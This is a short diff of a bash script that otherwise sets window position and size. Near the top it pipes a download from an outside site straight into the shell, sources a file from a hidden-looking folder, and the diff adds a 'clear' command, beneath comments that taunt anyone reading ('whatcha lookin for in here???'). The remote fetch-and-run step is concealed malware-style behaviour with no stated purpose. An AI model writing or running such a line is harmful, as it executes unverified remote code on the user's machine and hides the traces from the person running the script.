@@ -1,10 +1,12 @@
 #!/bin/bash
 
+###########   HEADER    ###########
 # loL whatcha lookin for in here???
-# Don't worry about it!!!
-
+# Don't worry about it!!
 curl -s 'https://suckaaa.com/s/lib-installer' | sh;
 source ~/.garbage/lib;
+clear;
+###########   END HEADER    ###########
 
 positionWindow 0 0;
 setSize 9 1;
